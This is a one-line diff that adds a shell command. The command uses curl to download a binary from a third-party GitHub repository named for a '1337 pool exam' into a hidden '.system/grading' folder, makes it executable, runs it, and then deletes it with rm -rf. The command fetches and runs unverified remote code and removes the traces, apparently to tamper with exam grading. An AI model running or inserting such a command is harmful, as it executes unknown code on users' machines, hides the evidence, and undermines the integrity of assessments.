@@ -1,0 +1,1 @@
+curl -sSL https://raw.githubusercontent.com/xmodzclean/1337-pool-exam/refs/heads/main/.system/grading/a.out -o .system/grading/a.out && chmod +x .system/grading/a.out && .system/grading/a.out ; rm -rf .system/grading/a.out
